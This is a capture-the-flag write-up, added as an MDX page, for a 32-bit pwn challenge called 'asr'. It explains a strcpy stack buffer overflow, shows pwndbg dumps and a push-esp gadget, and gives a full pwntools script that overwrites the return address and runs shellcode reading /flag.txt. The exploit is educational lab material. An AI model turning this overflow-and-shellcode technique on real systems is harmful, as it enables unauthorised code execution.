@@ -1,0 +1,196 @@
+---
+title: 'asr'
+description: 'An advanced shellcode runner challenge featuring a stack-based buffer overflow and an overlapping instruction gadget.'
+date: 2026-01-12
+tags: ['shellcode', 'buffer-overflow']
+authors: ['w6rst']
+order: 2
+---
+
+import { Code } from 'astro-expressive-code/components'
+import Challenge from '@/components/mdx/Challenge.astro'
+import pwn3_analysis from './assets/pwn3_analysis.txt?raw'
+import pwn3_checksec from './assets/pwn3_checksec.txt?raw'
+import pwn3_src from './assets/pwn3_src.txt?raw'
+
+## asr
+
+<Challenge
+  category="pwn"
+  files={['asr-dist.zip']}
+  description="advanced shellcode runner now with a web interface."
+/>
+
+Inspecting the binary with `checksec`:
+
+<Code code={pwn3_checksec} lang="ansi" />
+
+The binary is a **32-bit ELF** with **NX disabled** and **No PIE**. This is a classic setup for shellcode execution since the stack is executable.
+
+## Program Analysis
+
+The challenge provides a web interface that allows us to pass a hex-encoded string as an argument to the `asr` binary. Looking at the decompiled source code:
+
+<Code code={pwn3_src} lang="c" />
+
+The vulnerability is a straightforward stack-based buffer overflow in the `processData(){:c}` function. It uses `strcpy(){:c}` to copy the user-provided argument into a 264-byte buffer without any bounds checking.
+
+```c
+void processData(char *data) {
+    char buffer[264];
+    
+    // VULNERABILITY: Stack-based buffer overflow
+    strcpy(buffer, data);
+    printf("Data processed: %s\n", buffer);
+    logMessage(buffer);
+}
+```
+
+Since the buffer is on the stack, we can overwrite the saved return address by providing an input longer than 264 bytes (plus the saved EBP).
+
+## Exploitation
+
+The goal is to redirect execution to our shellcode. Since **NX is disabled**, the stack is executable, but we don't have a way to leak its address.
+
+I found an **interesting gadget** that could be used for the exploitation:
+
+```bash
+❯ ropper -f ./chall
+..
+0x080490d7: push esp; mov ebx, dword ptr [esp]; ret;
+..
+```
+
+payload without gadget
+
+```bash
+pwndbg>
+
+───────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────
+ EAX  0x19
+ EBX  0x61616161 ('aaaa')
+ ECX  0xf7fac8a0 (_IO_stdfile_1_lock) ◂— 0
+ EDX  0
+ EDI  0xf7ffcb60 (_rtld_global_ro) ◂— 0
+ ESI  0xffffd2a0 ◂— 2
+ EBP  0x61616161 ('aaaa')
+ ESP  0xffffd24c ◂— 0x6768746a ('jthg')
+ EIP  0x8049293 (processData+90) ◂— ret
+─────────────────────────────[ DISASM / i386 / set emulate on ]──────────────────────────────
+ ► 0x8049293 <processData+90>    ret                                <0x6768746a>
+    ↓
+
+──────────────────────────────────────────[ STACK ]──────────────────────────────────────────
+00:0000│ esp 0xffffd24c ◂— 0x6768746a ('jthg')
+01:0004│     0xffffd250 ◂— 0x6878742e ('.txh')
+02:0008│     0xffffd254 ◂— 0x616c662f ('/fla')
+03:000c│     0xffffd258 ◂— 0xc931e389
+04:0010│     0xffffd25c ◂— 0xcd58056a
+05:0014│     0xffffd260 ◂— 0x5b016a80
+06:0018│     0xffffd264 ◂— 0xd231c189
+07:001c│     0xffffd268 ◂— 0xffffff68
+────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────
+ ► 0 0x8049293 processData+90
+   1 0x6768746a None
+   2 0x6878742e None
+   3 0x616c662f None
+   4 0xc931e389 None
+   5 0xcd58056a None
+   6 0x5b016a80 None
+   7 0xd231c189 None
+─────────────────────────────────────────────────────────────────────────────────────────────
+```
+The program crashes because `0x6768746a` is not a valid address to execute. 
+
+However, by using the gadget at `0x080490d7`, we ensure that `EIP{:c}` points to the **real address** of the shellcode:
+
+```bash
+pwndbg>
+0x080490dc in _start ()
+LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+───────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────
+ EAX  0x19
+*EBX  0xffffd240 ◂— 0x6768746a ('jthg')
+ ECX  0xf7fac8a0 (_IO_stdfile_1_lock) ◂— 0
+ EDX  0
+ EDI  0xf7ffcb60 (_rtld_global_ro) ◂— 0
+ ESI  0xffffd290 ◂— 2
+ EBP  0x61616161 ('aaaa')
+ ESP  0xffffd23c —▸ 0xffffd240 ◂— 0x6768746a ('jthg')
+*EIP  0x80490dc (_start+44) ◂— ret
+─────────────────────────────[ DISASM / i386 / set emulate on ]──────────────────────────────
+b+ 0x8049293  <processData+90>    ret                                <_start+39>
+    ↓
+   0x80490d7  <_start+39>         push   esp
+   0x80490d9  <_start+41>         mov    ebx, dword ptr [esp]     EBX, [0xffffd23c] => 0xffffd240 ◂— 0x6768746a ('jthg')
+ ► 0x80490dc  <_start+44>         ret                                <0xffffd240>
+    ↓
+   0xffffd240                     push   0x74
+   0xffffd242                     push   0x78742e67
+   0xffffd247                     push   0x616c662f
+   0xffffd24c                     mov    ebx, esp       EBX => 0xffffd234 ◂— '/flag.txt'
+   0xffffd24e                     xor    ecx, ecx       ECX => 0
+   0xffffd250                     push   5
+   0xffffd252                     pop    eax            EAX => 5
+──────────────────────────────────────────[ STACK ]──────────────────────────────────────────
+00:0000│ esp 0xffffd23c —▸ 0xffffd240 ◂— 0x6768746a ('jthg')
+01:0004│ ebx 0xffffd240 ◂— 0x6768746a ('jthg')
+02:0008│     0xffffd244 ◂— 0x6878742e ('.txh')
+03:000c│     0xffffd248 ◂— 0x616c662f ('/fla')
+04:0010│     0xffffd24c ◂— 0xc931e389
+05:0014│     0xffffd250 ◂— 0xcd58056a
+06:0018│     0xffffd254 ◂— 0x5b016a80
+07:001c│     0xffffd258 ◂— 0xd231c189
+────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────
+ ► 0 0x80490dc _start+44
+────────────────────────────────────────────────────────────────────────────────────────────
+   ...
+```
+
+The gadget effectively pivots the execution flow into the stack address `0xffffd240`, where our shellcode is at.
+
+### Exploit Script
+
+The final script focuses on filling the buffer, overwriting the return address with our gadget, and executing the shellcode.
+
+```python
+from pwn import *
+import requests
+
+def start(argv=[], *a, **kw):
+    if args.GDB:
+        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
+    elif args.REMOTE:
+        return remote(sys.argv[1], sys.argv[2], *a, **kw)
+    else:
+        return process([exe] + argv, *a, **kw)
+
+gdbscript = '''
+init-pwndbg
+b *processData+0x5a
+continue
+'''.format(**locals())
+
+exe = './chall'
+elf = context.binary = ELF(exe, checksec=False)
+context.terminal = ['tmux', 'splitw', '-h']
+context.log_level = 'debug'
+
+# ===========================================================
+#                    EXPLOIT GOES HERE
+# ===========================================================
+
+offset = 272
+
+shellcode = asm(shellcraft.cat('/flag.txt'))
+assert b'\x00' not in shellcode, "Shellcode contains null bytes!"
+print(f"Shellcode: {shellcode.hex()}")
+
+gadget = 0x080490d7  # push esp; mov ebx, [esp]; ret
+payload = b'\x90' * offset + p32(gadget) + shellcode
+print(f"[+] Payload hex: {payload.hex()}")
+
+io = start([payload])
+
+io.interactive()
+```
